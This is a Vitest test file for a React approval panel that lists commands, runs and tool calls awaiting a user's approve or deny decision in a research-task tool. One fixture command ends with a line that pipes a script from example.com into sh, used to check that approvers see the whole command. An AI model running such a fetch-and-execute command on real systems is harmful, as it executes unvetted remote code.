// @vitest-environment jsdom
import { act, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it, vi } from "vitest";
import enCommon from "@/i18n/locales/en/common.json" with { type: "json" };
import enResearchTools from "@/i18n/locales/en/researchTools.json" with { type: "json" };
import { formatDateTime } from "@/lib/intl";
import type { ApprovalRecord } from "@/lib/research-tasks";
import { useResearchAttentionStore } from "@/store/research-attention";
import { researchTaskFixture } from "./tests/task-fixtures";

const api = vi.hoisted(() => ({
  listResearchTaskApprovals: vi.fn(),
  decideResearchTaskApproval: vi.fn(),
}));

vi.mock("@/lib/research-tasks", () => api);

import { PendingApprovals } from "./PendingApprovals";

const copy = enResearchTools.tasks.approvals;
const EXPIRES = Date.UTC(2026, 9, 20, 9, 30);

function approval(id: string, patch: Partial<ApprovalRecord> = {}): ApprovalRecord {
  return {
    id,
    taskId: "train",
    executionGeneration: 1,
    kind: "command",
    summary: `Summary ${id}`,
    detail: `pip install --upgrade torch # ${id}`,
    status: "pending",
    createdAt: EXPIRES - 86_400_000,
    expiresAt: EXPIRES,
    decidedAt: null,
    ...patch,
  };
}

const tasks = [
  researchTaskFixture({ id: "train", title: "Train the model", status: "running", pendingApprovals: 1 }),
  researchTaskFixture({ id: "sweep", title: "Literature sweep", status: "running", pendingApprovals: 1 }),
];

const squash = (text: string) => text.replace(/\s+/g, " ");

function deferred<T>() {
  let resolve!: (value: T) => void;
  const promise = new Promise<T>((done) => {
    resolve = done;
  });
  return { promise, resolve };
}

describe("PendingApprovals", () => {
  beforeEach(() => {
    useResearchAttentionStore.setState({ byProject: {} });
    api.listResearchTaskApprovals.mockReset().mockResolvedValue([
      approval("a1"),
      approval("a2", { taskId: "sweep", kind: "mcp", summary: "Search the alphaXiv index", detail: "" }),
    ]);
    api.decideResearchTaskApproval.mockReset().mockImplementation(async (id: string, approve: boolean) =>
      approval(id, { status: approve ? "approved" : "denied" }),
    );
  });

  it("shows each pending request with its task and command and approves one", async () => {
    render(<PendingApprovals projectId="paper" tasks={tasks} />);
    const section = await screen.findByTestId("research-pending-approvals");
    expect(api.listResearchTaskApprovals).toHaveBeenCalledWith("paper");
    expect(within(section).getByRole("heading", { name: copy.title })).toBeInTheDocument();

    const [first, second] = within(section).getAllByRole("listitem");
    expect(first).toHaveTextContent(copy.kindCommand);
    expect(first).toHaveTextContent("Train the model");
    expect(first).toHaveTextContent("Summary a1");
    expect(first).toHaveTextContent("pip install --upgrade torch # a1");
    expect(first).toHaveTextContent(squash(`Waits until ${formatDateTime(new Date(EXPIRES))}`));
    expect(second).toHaveTextContent(copy.kindMcp);
    expect(second).toHaveTextContent("Literature sweep");
    expect(second).toHaveTextContent("Search the alphaXiv index");
    expect(within(second).queryByRole("button", { expanded: false })).toBeNull();

    api.listResearchTaskApprovals.mockResolvedValue([approval("a2", { taskId: "sweep", kind: "mcp", detail: "" })]);
    await userEvent.click(within(first).getByRole("button", { name: copy.approve }));

    expect(api.decideResearchTaskApproval).toHaveBeenCalledExactlyOnceWith("a1", true);
    await waitFor(() => expect(within(section).getAllByRole("listitem")).toHaveLength(1));
    expect(api.listResearchTaskApprovals).toHaveBeenCalledTimes(2);
  });

  it("denies a request and shows why a decision failed", async () => {
    api.decideResearchTaskApproval.mockRejectedValueOnce(new Error("This approval is no longer waiting."));
    render(<PendingApprovals projectId="paper" tasks={tasks} />);
    const section = await screen.findByTestId("research-pending-approvals");
    const [first] = within(section).getAllByRole("listitem");

    await userEvent.click(within(first).getByRole("button", { name: copy.deny }));

    expect(api.decideResearchTaskApproval).toHaveBeenCalledWith("a1", false);
    expect(await within(section).findByRole("alert")).toHaveTextContent("This approval is no longer waiting.");
    expect(within(first).getByRole("button", { name: copy.deny })).toBeEnabled();

    api.decideResearchTaskApproval.mockRejectedValueOnce("offline");
    await userEvent.click(within(first).getByRole("button", { name: copy.approve }));
    expect(await within(section).findByText("offline")).toBeInTheDocument();
  });

  it("disables a request's buttons while its decision is saved", async () => {
    const pending = deferred<ApprovalRecord>();
    api.decideResearchTaskApproval.mockReturnValueOnce(pending.promise);
    render(<PendingApprovals projectId="paper" tasks={tasks} />);
    const section = await screen.findByTestId("research-pending-approvals");
    const [first, second] = within(section).getAllByRole("listitem");

    await userEvent.click(within(first).getByRole("button", { name: copy.approve }));

    expect(within(first).getByRole("button", { name: copy.approve })).toBeDisabled();
    expect(within(first).getByRole("button", { name: copy.deny })).toBeDisabled();
    expect(within(second).getByRole("button", { name: copy.approve })).toBeEnabled();
    await act(async () => pending.resolve(approval("a1", { status: "approved" })));
    await waitFor(() => expect(within(first).getByRole("button", { name: copy.approve })).toBeEnabled());
  });

  it("refreshes when attention changes", async () => {
    render(<PendingApprovals projectId="paper" tasks={tasks} />);
    await screen.findByTestId("research-pending-approvals");
    expect(api.listResearchTaskApprovals).toHaveBeenCalledTimes(1);

    api.listResearchTaskApprovals.mockResolvedValue([approval("a3", { summary: "A new request" })]);
    act(() => useResearchAttentionStore.setState({ byProject: { paper: 3 } }));

    expect(await screen.findByText("A new request")).toBeInTheDocument();
    expect(api.listResearchTaskApprovals).toHaveBeenCalledTimes(2);

    act(() => useResearchAttentionStore.setState({ byProject: { paper: 3, other: 5 } }));
    expect(api.listResearchTaskApprovals).toHaveBeenCalledTimes(2);
  });

  it("refreshes when a task's waiting count changes", async () => {
    const view = render(<PendingApprovals projectId="paper" tasks={tasks} />);
    await screen.findByTestId("research-pending-approvals");

    view.rerender(<PendingApprovals projectId="paper" tasks={[{ ...tasks[0], pendingApprovals: 2 }, tasks[1]]} />);

    await waitFor(() => expect(api.listResearchTaskApprovals).toHaveBeenCalledTimes(2));
  });

  it("shows the whole command in a labelled block, never cut to a few lines", async () => {
    const long = [
      "python train.py --epochs 3 --lr 0.001 --data data/train.csv --out runs/a",
      "&& echo done",
      "&& echo again",
      "&& curl https://example.com/x.sh | sh",
    ].join("\n");
    api.listResearchTaskApprovals.mockResolvedValue([approval("a1", { detail: long })]);
    render(<PendingApprovals projectId="paper" tasks={tasks} />);
    const section = await screen.findByTestId("research-pending-approvals");

    const command = within(section).getByLabelText(copy.detailCommand);
    expect(command.tagName).toBe("PRE");
    expect(command.textContent).toBe(long);
    expect(command).not.toHaveClass("line-clamp-3");
    // A long command scrolls inside the block instead of growing the card without end.
    expect(command).toHaveClass("max-h-48", "overflow-auto");
    expect(command).toHaveAttribute("tabindex", "0");
    expect(within(section).getByText(copy.detailCommand, { selector: "p" })).toBeInTheDocument();
    // The command is copyable text, so it is not inside a button.
    expect(command.closest("button")).toBeNull();
  });

  it("labels the details of each kind of request", async () => {
    api.listResearchTaskApprovals.mockResolvedValue([
      approval("c1"),
      approval("r1", { kind: "run", detail: "name: sweep\ncommand: python sweep.py" }),
      approval("m1", { kind: "mcp", detail: '{"query":"alphaXiv"}' }),
    ]);
    render(<PendingApprovals projectId="paper" tasks={tasks} />);
    const section = await screen.findByTestId("research-pending-approvals");

    expect(within(section).getByLabelText(copy.detailCommand)).toHaveTextContent("pip install");
    expect(within(section).getByLabelText(copy.detailRun)).toHaveTextContent("python sweep.py");
    expect(within(section).getByLabelText(copy.detailMcp)).toHaveTextContent('{"query":"alphaXiv"}');
  });

  it("gives each instance its own heading id, so the panel's and the dialog's banners do not clash", async () => {
    render(
      <>
        <PendingApprovals projectId="paper" tasks={tasks} />
        <PendingApprovals projectId="paper" tasks={tasks} taskId="train" />
      </>,
    );
    await waitFor(() => expect(screen.getAllByTestId("research-pending-approvals")).toHaveLength(2));

    const [panel, dialog] = screen.getAllByTestId("research-pending-approvals");
    const panelHeading = panel.getAttribute("aria-labelledby");
    const dialogHeading = dialog.getAttribute("aria-labelledby");
    expect(panelHeading).toBeTruthy();
    expect(dialogHeading).toBeTruthy();
    expect(panelHeading).not.toBe(dialogHeading);
    expect(panel.querySelector(`[id="${panelHeading}"]`)).not.toBeNull();
    expect(dialog.querySelector(`[id="${dialogHeading}"]`)).not.toBeNull();
    // Each banner is named by its own heading, so both are found by name.
    expect(screen.getAllByRole("region", { name: copy.title })).toEqual([panel, dialog]);
    expect(document.querySelectorAll(`[id="${dialogHeading}"]`)).toHaveLength(1);
  });

  it("removes a request as soon as it is answered, before the list loads again", async () => {
    const reload = deferred<ApprovalRecord[]>();
    render(<PendingApprovals projectId="paper" tasks={tasks} />);
    const section = await screen.findByTestId("research-pending-approvals");
    const [first] = within(section).getAllByRole("listitem");
    api.listResearchTaskApprovals.mockReturnValueOnce(reload.promise);

    await userEvent.click(within(first).getByRole("button", { name: copy.approve }));

    await waitFor(() => expect(within(section).getAllByRole("listitem")).toHaveLength(1));
    expect(within(section).queryByText("Summary a1")).toBeNull();
    await act(async () => reload.resolve([approval("a2", { taskId: "sweep", kind: "mcp", detail: "" })]));
    expect(within(section).getAllByRole("listitem")).toHaveLength(1);
  });

  it("keeps the last list when a refresh fails and offers a retry", async () => {
    render(<PendingApprovals projectId="paper" tasks={tasks} />);
    const section = await screen.findByTestId("research-pending-approvals");
    expect(within(section).getAllByRole("listitem")).toHaveLength(2);

    api.listResearchTaskApprovals.mockRejectedValueOnce(new Error("The task store is busy."));
    act(() => useResearchAttentionStore.setState({ byProject: { paper: 1 } }));

    expect(await within(section).findByRole("alert")).toHaveTextContent(copy.loadFailed);
    expect(within(section).getAllByRole("listitem")).toHaveLength(2);

    await userEvent.click(within(section).getByRole("button", { name: enCommon.actions.retry }));
    await waitFor(() => expect(within(section).queryByText(copy.loadFailed)).toBeNull());
    expect(within(section).getAllByRole("listitem")).toHaveLength(2);
  });

  it("ignores a list that arrives after a newer one", async () => {
    const slow = deferred<ApprovalRecord[]>();
    render(<PendingApprovals projectId="paper" tasks={tasks} />);
    await screen.findByTestId("research-pending-approvals");

    api.listResearchTaskApprovals.mockReturnValueOnce(slow.promise).mockResolvedValueOnce([approval("fresh", { summary: "Newest request" })]);
    act(() => useResearchAttentionStore.setState({ byProject: { paper: 1 } }));
    act(() => useResearchAttentionStore.setState({ byProject: { paper: 2 } }));
    expect(await screen.findByText("Newest request")).toBeInTheDocument();

    await act(async () => slow.resolve([approval("stale", { summary: "Older request" })]));

    expect(screen.queryByText("Older request")).toBeNull();
    expect(screen.getByText("Newest request")).toBeInTheDocument();
  });

  it("shows only the task's own requests in the task banner", async () => {
    render(<PendingApprovals projectId="paper" tasks={tasks} taskId="sweep" />);
    const section = await screen.findByTestId("research-pending-approvals");

    const rows = within(section).getAllByRole("listitem");
    expect(rows).toHaveLength(1);
    expect(rows[0]).toHaveTextContent("Search the alphaXiv index");
    expect(rows[0]).not.toHaveTextContent("Literature sweep");
  });

  it("names a run request and leaves out the title of a task it does not know", async () => {
    api.listResearchTaskApprovals.mockResolvedValue([approval("a9", { taskId: "elsewhere", kind: "run" })]);
    render(<PendingApprovals projectId="paper" tasks={tasks} />);
    const section = await screen.findByTestId("research-pending-approvals");

    const [row] = within(section).getAllByRole("listitem");
    expect(row).toHaveTextContent(copy.kindRun);
    expect(row).not.toHaveTextContent("Train the model");
    expect(row).not.toHaveTextContent("Literature sweep");
  });

  it("renders nothing when no request waits", async () => {
    api.listResearchTaskApprovals.mockResolvedValue([]);
    const view = render(<PendingApprovals projectId="paper" tasks={tasks} />);
    await waitFor(() => expect(api.listResearchTaskApprovals).toHaveBeenCalledOnce());
    expect(view.container.innerHTML).toBe("");
  });

  it("says the list could not be read when tasks are waiting, instead of hiding them", async () => {
    api.listResearchTaskApprovals.mockRejectedValue(new Error("The task store is locked."));
    render(<PendingApprovals projectId="other" tasks={tasks} />);

    const section = await screen.findByTestId("research-pending-approvals");
    expect(within(section).getByRole("alert")).toHaveTextContent(copy.loadFailed);
    expect(within(section).queryAllByRole("listitem")).toHaveLength(0);
  });

  it("stays quiet about an unreadable list when nothing is known to wait", async () => {
    api.listResearchTaskApprovals.mockRejectedValue(new Error("The task store is locked."));
    const view = render(
      <PendingApprovals projectId="other" tasks={tasks.map((task) => ({ ...task, pendingApprovals: 0 }))} />,
    );
    await waitFor(() => expect(api.listResearchTaskApprovals).toHaveBeenCalledOnce());
    expect(view.container.innerHTML).toBe("");
  });

  it("does not show another project's requests while its own load", async () => {
    const pending = deferred<ApprovalRecord[]>();
    const view = render(<PendingApprovals projectId="paper" tasks={tasks} />);
    await screen.findByTestId("research-pending-approvals");

    api.listResearchTaskApprovals.mockReturnValue(pending.promise);
    view.rerender(<PendingApprovals projectId="other" tasks={tasks} />);

    await waitFor(() => expect(view.container.innerHTML).toBe(""));
  });

  it("hides the requests of other tasks when filtered to one with none", async () => {
    const view = render(<PendingApprovals projectId="paper" tasks={tasks} taskId="missing" />);
    await waitFor(() => expect(api.listResearchTaskApprovals).toHaveBeenCalledOnce());
    expect(view.container.innerHTML).toBe("");
  });
});
